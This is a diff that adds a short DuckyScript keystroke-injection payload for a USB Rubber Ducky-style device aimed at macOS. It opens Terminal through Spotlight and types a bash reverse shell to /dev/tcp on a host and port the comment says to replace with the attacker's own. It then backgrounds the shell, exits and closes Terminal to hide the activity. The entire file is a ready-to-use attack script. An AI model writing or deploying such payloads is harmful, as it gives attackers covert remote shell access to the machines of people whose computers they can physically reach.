@@ -1,0 +1,16 @@
+DELAY 1000
+GUI SPACE
+DELAY 100
+STRING terminal
+DELAY 100
+ENTER
+DELAY 1000
+REM Obviously change below to your IP and Port
+STRING bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &
+DELAY 100
+ENTER
+STRING exit
+DELAY 100
+ENTER
+DELAY 100
+GUI q
